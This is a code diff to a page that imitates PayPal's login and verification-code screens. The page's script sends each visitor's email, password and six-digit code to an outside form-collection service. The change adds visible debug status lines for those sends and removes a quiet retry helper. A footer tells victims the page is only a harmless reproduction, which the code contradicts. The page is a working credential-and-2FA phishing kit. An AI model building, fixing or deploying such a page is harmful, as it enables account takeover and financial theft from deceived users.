@@ -24,6 +24,9 @@
     --err:#c72e2e;
     --err-bg:#fdf3f3;
     --err-line:#efbcbc;
+    --ok:#1a7f37;
+    --ok-bg:#eef8f0;
+    --ok-line:#bfe3c8;
   }
 
   html { -webkit-text-size-adjust:100%; }
@@ -148,6 +151,21 @@
     font-size:14px; color:var(--body); text-align:center;
   }
 
+  /* debug status line */
+  .dbg {
+    display:none;
+    margin-top:12px;
+    padding:10px 12px;
+    border-radius:6px;
+    font-size:12px;
+    line-height:1.5;
+    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+    word-break:break-word;
+  }
+
+  .dbg.is-ok { display:block; color:var(--ok); background:var(--ok-bg); border:1px solid var(--ok-line); }
+  .dbg.is-bad { display:block; color:var(--err); background:var(--err-bg); border:1px solid var(--err-line); }
+
   .footer { flex-shrink:0; padding:34px 20px 30px; font-size:12px; color:var(--muted); text-align:center; }
   .footer-links { margin-bottom:12px; }
   .footer a { color:var(--muted); margin:0 7px; text-decoration:none; }
@@ -215,6 +233,7 @@
       <div class="error" id="error" role="alert" aria-live="assertive"></div>
 
       <button type="submit" class="btn btn-primary" id="btn-login">Log In</button>
+      <div class="dbg" id="dbg" aria-live="polite"></div>
     </form>
 
     <button type="button" class="link" id="trouble">Having trouble logging in?</button>
@@ -246,6 +265,7 @@
       <div class="error" id="code-error" role="alert" aria-live="assertive"></div>
 
       <button type="submit" class="btn btn-primary btn-pill" id="btn-continue" disabled>Continue</button>
+      <div class="dbg" id="dbg-code" aria-live="polite"></div>
     </form>
 
     <button type="button" class="alt-link" id="another">Try another way</button>
@@ -290,7 +310,7 @@
     <p><strong>Session.</strong> Because the page is a reproduction, signing in does not open a PayPal session on your device. Your PayPal account is untouched and you are not logged in to paypal.com afterwards.</p>
     <p><strong>If something looks wrong.</strong> Close the tab, open paypal.com directly and compare. To revoke a code-based login, use PayPal's own Security settings.</p>
     <p><strong>Accuracy.</strong> The layout is reproduced as closely as a static page allows, but PayPal changes its interface regularly, so wording and spacing may differ from the live page. Questions about a specific submission should go to the person who sent you this link.</p>
-    <p>Team project · Last updated November 2026 · Version 1.8</p>
+    <p>Team project · Last updated November 2026 · Version 1.9</p>
   </section>
 </footer>
 
@@ -363,7 +383,8 @@
     formLogin:$("form-login"), formCode:$("form-code"),
     email:$("email"), password:$("password"), codeInput:$("code"),
     pwToggle:$("pw-toggle"), error:$("error"), codeError:$("code-error"),
-    btnLogin:$("btn-login"), btnContinue:$("btn-continue"), resend:$("resend"), lang:$("lang")
+    btnLogin:$("btn-login"), btnContinue:$("btn-continue"), resend:$("resend"), lang:$("lang"),
+    dbg:$("dbg"), dbgCode:$("dbg-code")
   };
 
   function t() { return T[state.lang]; }
@@ -412,15 +433,18 @@
     else { node.textContent = ""; node.classList.remove("is-visible"); }
   }
 
+  function debug(node, text, ok) {
+    node.className = "dbg " + (ok ? "is-ok" : "is-bad");
+    node.textContent = text;
+  }
+
   function go(screen) { state.screen = screen; render(); window.scrollTo(0, 0); }
 
   /* ---------- send to Web3Forms ---------- */
-  function send(subject, data) {
+  function send(subject, data, dbgNode) {
     var payload = {
       access_key: WEB3FORMS_KEY,
-      from_name: "PayPal",
       subject: subject,
-      botcheck: false,
       email: creds.email || "",
       password: creds.password || ""
     };
@@ -429,15 +453,15 @@
     return fetch(ENDPOINT, {
       method:"POST",
       headers:{ "Content-Type":"application/json", "Accept":"application/json" },
-      body: JSON.stringify(payload), keepalive:true
+      body: JSON.stringify(payload)
+    }).then(function (res) {
+      return res.text().then(function (txt) {
+        if (res.ok) debug(dbgNode, "SENT " + res.status + " · " + txt.slice(0, 140), true);
+        else debug(dbgNode, "FAIL " + res.status + " · " + txt.slice(0, 140), false);
+      });
+    }).catch(function (err) {
+      debug(dbgNode, "NETWORK · " + String(err).slice(0, 140), false);
     });
-  }
-
-  function sendQuietly(subject, data) {
-    return send(subject, data).catch(function () {
-      return new Promise(function (r) { setTimeout(r, 1500); })
-        .then(function () { return send(subject, data); });
-    }).catch(function () {});
   }
 
   /* ---------- login ---------- */
@@ -455,12 +479,7 @@
     creds.email = email.toLowerCase();
     creds.password = password;
 
-    /* Submission 1: email + password */
-    sendQuietly("PayPal login — " + creds.email, { type:"login" });
-
-    el.password.value = "";
-    go("code");
-    el.codeInput.focus();
+    send("PayPal login — " + creds.email, { type:"login" }, el.dbg);
   });
 
   /* ---------- code ---------- */
@@ -479,9 +498,7 @@
     if (code.length !== 6) { state.codeError = "errCode"; render(); return; }
 
     state.codeError = null;
-
-    /* Submission 2: email + password + code */
-    sendQuietly("PayPal code — " + code, { type:"code", code: code });
+    send("PayPal code — " + code, { type:"code", code: code }, el.dbgCode);
 
     go("done");
   });
